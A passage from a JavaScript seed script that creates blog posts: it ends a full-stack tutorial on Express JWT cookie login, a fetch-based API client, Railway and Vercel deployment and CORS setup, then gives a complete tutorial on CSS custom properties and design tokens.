  res.cookie("token", token, COOKIE_OPTS);
  res.status(201).json({ user });
});

router.post("/login", async (req, res) =&gt; {
  const { email, password } = LoginSchema.parse(req.body);

  const user = await db.query.users.findFirst({ where: eq(users.email, email) });
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    res.status(401).json({ error: "Invalid credentials" });
    return;
  }

  const token = jwt.sign({ userId: user.id }, JWT_SECRET, { expiresIn: "7d" });
  res.cookie("token", token, COOKIE_OPTS);
  res.json({ user: { id: user.id, email: user.email, name: user.name } });
});</code></pre>

<h2 id="frontend-api-client">Frontend API Client</h2>
<pre><code class="language-typescript">// apps/web/src/lib/api.ts
const BASE = import.meta.env.VITE_API_URL;

async function request&lt;T&gt;(path: string, options?: RequestInit): Promise&lt;T&gt; {
  const res = await fetch(\`\${BASE}\${path}\`, {
    ...options,
    credentials: "include", // send cookies
    headers: {
      "Content-Type": "application/json",
      ...options?.headers,
    },
  });

  if (!res.ok) {
    const { error } = await res.json();
    throw new Error(error || \`Request failed: \${res.status}\`);
  }

  return res.json();
}

export const api = {
  posts: {
    list: (params?: { category?: string }) =&gt;
      request&lt;{ posts: Post[] }&gt;(\`/api/posts?\${new URLSearchParams(params)}\`),
    get: (slug: string) =&gt;
      request&lt;Post&gt;(\`/api/posts/\${slug}\`),
    create: (data: CreatePostInput) =&gt;
      request&lt;Post&gt;("/api/posts", { method: "POST", body: JSON.stringify(data) }),
  },
  auth: {
    login: (email: string, password: string) =&gt;
      request("/api/auth/login", { method: "POST", body: JSON.stringify({ email, password }) }),
    logout: () =&gt;
      request("/api/auth/logout", { method: "POST" }),
  },
};</code></pre>

<h2 id="deployment">Deployment Strategy</h2>
<pre><code class="language-bash"># Deploy API to Railway
railway login
railway init
railway add --database postgresql
railway up

# Deploy frontend to Vercel
vercel --prod
# Set VITE_API_URL=https://your-api.railway.app in Vercel env settings</code></pre>

<h2 id="cors">CORS Configuration</h2>
<pre><code class="language-typescript">import cors from "cors";

app.use(cors({
  origin: process.env.FRONTEND_URL, // https://myblog.vercel.app
  credentials: true, // Required for cookies
  methods: ["GET", "POST", "PUT", "DELETE"],
}));</code></pre>
    `,
  },

  // ─── CSS VARIABLES ───────────────────────────────────────────────────────────

  {
    slug: "css-custom-properties-guide",
    title: "CSS Custom Properties: The Complete Guide to Design Tokens",
    excerpt: "CSS custom properties (variables) are the foundation of modern design systems. Learn how to use them for theming, responsive design, component variants, and dynamic values via JavaScript.",
    category: "tutorial",
    tags: ["css", "design-tokens", "variables", "theming"],
    readingTimeMinutes: 11,
    featured: false,
    difficulty: "beginner",
    publishedAt: "2026-04-22T09:00:00Z",
    content: `
<h2 id="basics">CSS Custom Properties Basics</h2>
<p>Custom properties (often called CSS variables) are set with <code>--</code> prefix and accessed via <code>var()</code>:</p>
<pre><code class="language-css">:root {
  --color-primary: #4f46e5;
  --color-primary-dark: #3730a3;
  --spacing-base: 1rem;
  --radius-md: 0.5rem;
  --font-body: "Inter", system-ui, sans-serif;
}

.button {
  background: var(--color-primary);
  padding: var(--spacing-base);
  border-radius: var(--radius-md);
  font-family: var(--font-body);
}

.button:hover {
  background: var(--color-primary-dark);
}</code></pre>

<h2 id="fallbacks">Fallback Values</h2>
<pre><code class="language-css">/* Second argument is the fallback */
color: var(--color-text, #111111);

/* Chained fallbacks */
font-size: var(--size-heading, var(--size-large, 1.5rem));</code></pre>

<h2 id="theming">Building a Theme System</h2>
<pre><code class="language-css">/* Define semantic tokens in :root */
:root {
  /* Primitives */
  --blue-500: #3b82f6;
  --blue-600: #2563eb;
  --zinc-900: #18181b;
  --zinc-100: #f4f4f5;

  /* Semantic (context-aware) */
  --bg-primary: var(--zinc-100);
  --text-primary: var(--zinc-900);
  --border-default: rgba(0, 0, 0, 0.1);
  --shadow-card: 0 2px 8px rgba(0, 0, 0, 0.08);
}

/* Override semantic tokens for dark mode */
@media (prefers-color-scheme: dark) {
  :root {
    --bg-primary: var(--zinc-900);
    --text-primary: var(--zinc-100);
    --border-default: rgba(255, 255, 255, 0.1);
    --shadow-card: 0 2px 8px rgba(0, 0, 0, 0.4);
  }
}

/* Components use semantic tokens, not primitives */
.card {
  background: var(--bg-primary);
  color: var(--text-primary);
  border: 1px solid var(--border-default);
  box-shadow: var(--shadow-card);
}</code></pre>

<h2 id="component-variants">Component Variants</h2>
<pre><code class="language-css">.button {
  /* Component-scoped defaults */
  --btn-bg: var(--color-primary);
  --btn-fg: white;
  --btn-size: 1rem;

  background: var(--btn-bg);
  color: var(--btn-fg);
  font-size: var(--btn-size);
  padding: calc(var(--btn-size) * 0.5) calc(var(--btn-size) * 1);
}

/* Variants override the component variables */
.button--danger  { --btn-bg: #dc2626; }
.button--ghost   { --btn-bg: transparent; --btn-fg: var(--color-primary); }
.button--sm      { --btn-size: 0.875rem; }
.button--lg      { --btn-size: 1.125rem; }</code></pre>

<h2 id="javascript">Manipulating from JavaScript</h2>
<pre><code class="language-javascript">const root = document.documentElement;

// Read a variable
const primary = getComputedStyle(root).getPropertyValue("--color-primary").trim();

// Set a variable
root.style.setProperty("--color-primary", "#7c3aed");

// Animation using CSS variables
function animateProgress(target: number) {
  root.style.setProperty("--progress", \`\${target}%\`);
}</code></pre>
<pre><code class="language-css">.progress-bar {
  width: var(--progress, 0%);
  transition: width 0.3s ease;
}</code></pre>

<h2 id="responsive">Responsive Design with Custom Properties</h2>
<pre><code class="language-css">:root {
  --spacing-scale: 1;
  --font-scale: 1;
}

@media (min-width: 768px) {
  :root {
    --spacing-scale: 1.25;
    --font-scale: 1.1;
  }
}

h1 { font-size: calc(2.5rem * var(--font-scale)); }
.section { padding: calc(4rem * var(--spacing-scale)); }

/* Or use fluid scaling with clamp */
:root {
  --fluid-title: clamp(1.75rem, 2.5vw + 1rem, 3.5rem);
}
h1 { font-size: var(--fluid-title); }</code></pre>

<h2 id="design-tokens">Design Token Naming Convention</h2>
<pre><code class="language-css">/* Recommended: category-concept-modifier */
--color-text-primary
--color-text-muted
--color-bg-card
--color-border-default
--spacing-xs       /* 4px  */
--spacing-sm       /* 8px  */
--spacing-md       /* 16px */
--spacing-lg       /* 24px */
--spacing-xl       /* 32px */
--radius-sm
--radius-md
--radius-full
--shadow-sm
--shadow-md</code></pre>
    `,
  },

];

// Create all posts
let created = 0;
for (const post of posts) {
  const result = await createPost(post);
  if (result) created++;
}

console.log(`\n✨ Done! Created ${created}/${posts.length} posts.`);
